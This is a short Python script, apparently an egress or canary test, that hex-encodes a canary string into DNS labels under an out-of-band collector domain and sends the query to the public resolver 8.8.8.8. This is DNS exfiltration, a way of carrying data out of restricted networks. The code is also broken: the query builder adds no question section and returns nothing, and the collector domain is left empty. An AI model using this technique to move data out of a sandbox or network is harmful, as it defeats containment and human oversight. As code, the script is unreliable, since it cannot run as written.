#!/usr/bin/env python3

import socket
import struct
import random



DATA = b"XAI_H1_REPLICA2_CANARY_20260810_1014_6F2C9A"


OAST_BASE = ""

DNS_SERVER = "8.8.8.8"
DNS_PORT = 53



def qname(name: str) -> bytes:
    """Encode a DNS QNAME (domain name) as per RFC 1035."""
    out = b""
    for label in name.split("."):
        b = label.encode("ascii")
        if len(b) > 63:
            raise ValueError(f"Label too long: {label!r}")
        out += bytes([len(b)]) + b
    return out + b"\x00"


def build_dns_query(qname_bytes: bytes, tid: int) -> bytes:
  
  
    header = struct.pack(
        "!HHHHHH",
        tid,        # ID
        0x0100,     # Flags: standard query
        1,          # QDCOUNT
        0,          # ANCOUNT
        0,          # NSCOUNT
        0,          # ARCOUNT
    )
    



def main():
    
    encoded = DATA.hex()

  
    chunks = [encoded[i:i+50] for i in range(0, len(encoded), 50)]

    
    fqdn = ".".join(chunks + [OAST_BASE])
    print(f"DATA={DATA.decode('ascii', errors='replace')}")
    print(f"ENCODED={encoded}")
    print(f"OAST_FQDN={fqdn}")

   
    qname_bytes = qname(fqdn)
    tid = random.randrange(65536)
    packet = build_dns_query(qname_bytes, tid)

   
    print(f"Sending DNS query to {DNS_SERVER}:{DNS_PORT} ...")
    s = socket.create_connection((DNS_SERVER, DNS_PORT), timeout=5)
    s.sendall(struct.pack("!H", len(packet)) + packet)

    
    hdr = s.recv(2)
    if len(hdr) < 2:
        print("No response received.")
        s.close()
        return

    length = struct.unpack("!H", hdr)[0]
    reply = b""
    while len(reply) < length:
        part = s.recv(length - len(reply))
        if not part:
            break
        reply += part

    s.close()

    if len(reply) < 12:
        print("Invalid DNS response.")
        return

    rid, flags = struct.unpack("!HH", reply[:4])
    rcode = flags & 0x0F

    print(f"DNS_RESPONSE=YES")
    print(f"TXID_MATCH={'YES' if rid == tid else 'NO'}")
    print(f"RCODE={rcode}")

    if rcode == 0:
        print("DNS query successful (NOERROR).")
    else:
        print(f"DNS query returned error code: {rcode}")


if __name__ == "__main__":
    main()
